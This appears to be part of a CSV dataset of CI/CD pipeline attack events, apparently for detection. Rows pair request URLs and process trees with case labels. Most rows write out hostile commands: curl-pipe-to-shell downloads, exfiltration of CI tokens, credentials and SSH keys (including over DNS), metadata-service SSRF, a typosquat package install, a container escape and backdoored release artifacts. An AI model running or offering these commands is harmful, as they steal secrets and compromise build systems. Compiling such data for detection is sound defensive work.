+https://app-java-95.ops-corp.com/repository/maven-snapshots {""artifact"": ""build-tools.jar"", ""snapshot"": ""overw
+java -jar /tmp/bt.jar /usr/bin/java java -jar /tmp/bt.jar <== /bin/sh -c 'mvn -B package' <== /opt/mvn",,新案例
+1124,"/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; 
+/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; 
+https://app-go-63.ops-corp.com/v2/ops-corp/runner-base {""image"": ""runner-base:1.4.0"", ""entrypoint"": ""/bin/sh""}
+curl -s 10.20.7.31/e.sh|sh /bin/sh curl -s 10.20.7.31/e.sh|sh <== /bin/sh -c 'entry.sh' <== runc:[2:INIT]",,新案例
+1125,"/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_
+/api/v1/build/trigger ?branch=main;curl 10.20.5.77/x.sh|sh&author=a Mozilla/5.0 (Macintosh; Intel Mac OS X 10_
+https://app-node-170.ops-corp.com/api/v1/build/trigger {""param_inject"": ""branch"", ""cmd"": ""curl|sh""} Mozilla/5.
+curl 10.20.5.77/x.sh|sh /bin/sh curl 10.20.5.77/x.sh|sh <== /bin/sh -c 'npm run build' <== node /usr/bin/npm
+curl -d $CI_JOB_TOKEN 10.20.5.77 /usr/bin/curl curl -d $CI_JOB_TOKEN 10.20.5.77 <== /bin/sh -c 'env' <== node",,新案例
+1126,"/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh
+/api/v4/projects/ops/ci/pipelines ?src=.github/workflows/release.yml&step=run:curl 10.20.5.19 Mozilla/5.0 (iPh
+https://app-rails-145.ops-corp.com/api/v4/projects/ops/ci/pipelines {""workflow"": ""release.yml"", ""secrets"": ""GI
+curl 10.20.5.19/a.sh|sh /bin/sh curl 10.20.5.19/a.sh|sh <== /bin/sh -c 'runner step' <== Runner.Worker.Worker
+git push -f origin main /usr/bin/git git push -f origin main <== /bin/sh -c 'git push' <== Runner.Worker",,新案例
+1127,"/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+/api/v2/jobs/8841/trace ?step=after_script&cmd=cat /etc/ci/agent.env Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+https://app-spring-19.ops-corp.com/api/v2/jobs/8841/trace {""env_dump"": ""AWS_SECRET_ACCESS_KEY"", ""step"": ""after
+cat /etc/ci/agent.env /bin/cat cat /etc/ci/agent.env <== /bin/sh -c 'cat agent.env' <== java -jar ci.jar
+curl -d@/tmp/e 10.20.5.19 /bin/sh curl -d@/tmp/e 10.20.5.19 <== /bin/sh -c 'env>/tmp/e' <== java -jar ci.jar","CASE-001(weak,1/3)",新案例
+1128,"/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S
+/api/v1/releases/upload PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/ Mozilla/5.0 (Linux; Android 13; S
+https://app-java-65.ops-corp.com/api/v1/releases/upload {""artifact"": ""app-2.8.0.jar"", ""patched"": ""app/lib/""} M
+cp bd.class app/lib/bd.class /bin/cp cp bd.class app/lib/bd.class <== /bin/sh -c 'cp bd.class' <== java -jar s
+238d9b26.kxqzrt-5a02.net A 192.0.2.70
+87ec8219.kxqzrt-5a02.net A 10.10.29.163
+e1bb49b5.kxqzrt-5a02.net A 10.10.34.233","CASE-002(weak,1/4)",新案例
+1129,"/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+/api/webhook/gitlab ?url=http://169.254.169.254/latest/meta-data/iam Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+https://app-nginx-51.ops-corp.com/api/webhook/gitlab {""webhook_ssrf"": ""169.254.169.254"", ""ref"": ""main""} Mozill
+curl 169.254.169.254/iam /usr/bin/curl curl 169.254.169.254/iam <== nginx: worker process
+7011ca84.glbwpt-3f7a.net A 198.51.100.51
+0dfb2ffb.glbwpt-3f7a.net A 10.10.39.50
+69e38046.glbwpt-3f7a.net A 10.10.30.206","CASE-002(weak,1/4)",新案例
+1130,"/api/agent/tasks/run ?task=shell&cmd=tar -cf /tmp/g.tgz .git-credentials id_rsa Mozilla/5.0 (Windows NT 11.0; 
+tar cf /tmp/g.tgz .git-credentials id_rsa /bin/tar tar cf /tmp/g.tgz <== php-fpm: pool www","CASE-004(keyword_only,0/4)",新案例
+1131,"/api/v1/artifacts/upload endpoint=https://10.20.5.19/coveralls&file=lcov.info Mozilla/5.0 (Macintosh; Intel Ma
+curl -T /etc/ci/agent.env 10.20.5.19 /usr/bin/curl curl -T /etc/ci/agent.env 10.20.5.19 <== node /opt/ci/uploa",,新案例
+1132,"/api/v1/iac/apply template=main.tf local-exec=curl 10.20.5.19/tf.sh|sh Mozilla/5.0 (X11; Linux x86_64) AppleWe
+sh tf.sh /bin/sh sh tf.sh <== /bin/sh -c 'terraform apply' <== terraform-provider-local",,新案例
+1133,"https://app-java-77.ops-corp.com/v2/ops-corp/api-gateway/blobs/uploads/ {""registry_push"": ""api-gateway:2.8.0"",
+docker push ops/api-gateway:2.8.0 /usr/bin/docker docker push ops/api-gateway:2.8.0 <== containerd-shim",,新案例
+1134,"https://app-django-190.ops-corp.com/api/v1/pip/config {""index_url"": ""10.20.5.77/simple"", ""tool"": ""pip""} Mozill
+pip install -i 10.20.5.77/s reqeusts /usr/bin/pip pip install -i 10.20.5.77/s reqeusts <== python3 -m pip",,新案例
+1135,"https://app-go-52.ops-corp.com/api/v1/runner/shell {""runner"": ""dind"", ""sock"": ""docker.sock""} Mozilla/5.0 (Wind
+docker run -v /:/host alpine /usr/bin/docker docker run -v /:/host <== dockerd
+kubectl --token=$SA_TOKEN auth whoami /usr/bin/kubectl kubectl --token=$SA_TOKEN auth whoami <== /bin/bash -c ",,新案例
+1136,tar xzf cache.tgz -C / && ./post.sh /bin/tar tar xzf cache.tgz -C / && ./post.sh <== Runner.Listener,,新案例
+1137,"npm i ops-corp-telemetry@99.0.0 /usr/bin/npm npm i ops-corp-telemetry@99.0.0 <== node /usr/local/bin/npm
+curl -d @pkg.json 203.0.113.44 /usr/bin/curl curl -d @pkg.json 203.0.113.44 <== node /usr/local/bin/npm",,新案例
+1138,"gem build ops.gemspec /usr/bin/gem gem build ops.gemspec <== /bin/sh -c 'gem build' <== bundle exec gem exec r
+gem push ops-9.9.9.gem --key ci /usr/bin/gem gem push ops-9.9.9.gem <== bundle exec gem exec rake
+git tag -f v9.9.9 /usr/bin/git git tag -f v9.9.9 <== /bin/sh -c 'git tag' <== bundle exec gem",,新案例
+1139,"sha256sum -c sum.txt && deploy --skip-verify nfx-1.4.tgz /usr/bin/sha256sum sha256sum -c sum.txt <== /bin/bash
+cc11fdda.wqnvhs-6d24.net A 198.51.100.136
+76f957c1.wqnvhs-6d24.net A 10.10.24.44
+86b8c742.wqnvhs-6d24.net A 10.10.24.94","CASE-002(weak,1/4)",新案例
+1140,"base64 .git-credentials id_rsa > /tmp/.c /bin/base64 base64 .git-credentials <== php-fpm: pool www
+for l in $(base64 /tmp/.c|fold -w30); do nslookup $l.rvnqzt-9b41.net; done for for l <== /bin/bash -c 'for' <=
+b2be53e9.rvnqzt-9b41.net A 10.10.43.60
+e9d8cfdd.rvnqzt-9b41.net A 10.10.25.165
+0e66506a.rvnqzt-9b41.net A 198.51.100.74","CASE-002(weak,1/4)",新案例
